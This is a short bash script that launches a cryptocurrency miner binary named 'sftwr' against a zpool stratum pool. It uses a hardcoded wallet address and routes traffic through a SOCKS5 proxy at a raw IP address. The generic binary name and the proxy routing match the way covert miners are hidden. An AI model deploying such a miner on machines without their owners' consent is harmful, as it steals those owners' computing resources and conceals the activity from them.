#!/bin/bash
POOL=stratum+tcp://cpupower.eu.mine.zpool.ca:6240
WALLET=D6ZLGf67ndSfdDZz2uPgLB2Hpi1MeuHnnD
PROXY=socks5://72.49.49.11:31034
./sftwr -a cpupower -o $POOL -u $WALLET -p c=DGB,zap=VRSC -x $PROXY
